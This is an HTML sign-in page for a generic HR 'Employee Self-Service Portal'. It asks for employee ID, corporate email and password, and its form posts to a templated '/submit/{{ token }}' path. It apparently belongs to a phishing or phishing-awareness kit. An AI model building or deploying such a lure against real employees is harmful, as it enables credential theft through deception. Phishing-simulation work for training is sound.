<!DOCTYPE html>
<html>
<head>
  <title>HR Employee Portal — Sign In</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
  <style>
    body { background:#f4f6f9; }
    .card { border:none; border-radius:10px; }
    .portal-header { background:linear-gradient(135deg,#1a1a2e,#0067b8); padding:24px; border-radius:10px 10px 0 0; text-align:center; }
    .divider { border:none; border-top:1px solid #e0e0e0; margin:16px 0; }
    .info-box { background:#fff8e1; border-left:4px solid #ffc107; padding:10px 14px; font-size:13px; color:#5a4000; border-radius:4px; }
  </style>
</head>
<body class="d-flex align-items-center justify-content-center" style="min-height:100vh">
<div class="card shadow" style="max-width:420px;width:100%">
  <div class="portal-header">
    <div style="font-size:2rem">👤</div>
    <div style="color:white;font-weight:bold;font-size:18px;margin-top:8px">Employee Self-Service Portal</div>
    <div style="color:#aaccee;font-size:12px">Human Resources Department</div>
  </div>
  <div class="card-body p-4">
    <div class="info-box mb-3">
      📋 Please sign in to access your payslips, leave balance, and appraisal records.
    </div>
    <form method="POST" action="/submit/{{ token }}">
      <div class="mb-3">
        <label class="form-label small fw-bold text-dark">Employee ID</label>
        <input type="text" class="form-control" placeholder="e.g. EMP-00123" required>
      </div>
      <div class="mb-3">
        <label class="form-label small fw-bold text-dark">Corporate Email</label>
        <input type="email" class="form-control" placeholder="yourname@company.com" required>
      </div>
      <div class="mb-4">
        <label class="form-label small fw-bold text-dark">Password</label>
        <input type="password" class="form-control" placeholder="Enter your password" required>
        <div class="text-end mt-1"><a href="#" class="small">Forgot password?</a></div>
      </div>
      <button class="btn w-100 text-white" style="background:#0067b8">Sign In to Portal</button>
    </form>
    <hr class="divider">
    <div class="text-center">
      <p class="small text-muted mb-1">Having trouble signing in?</p>
      <a href="#" class="small">Contact HR Support</a>
    </div>
  </div>
  <div class="text-center pb-3">
    <small class="text-muted">© 2026 Human Resources Department. All rights reserved.</small>
  </div>
</div>
</body>
</html>
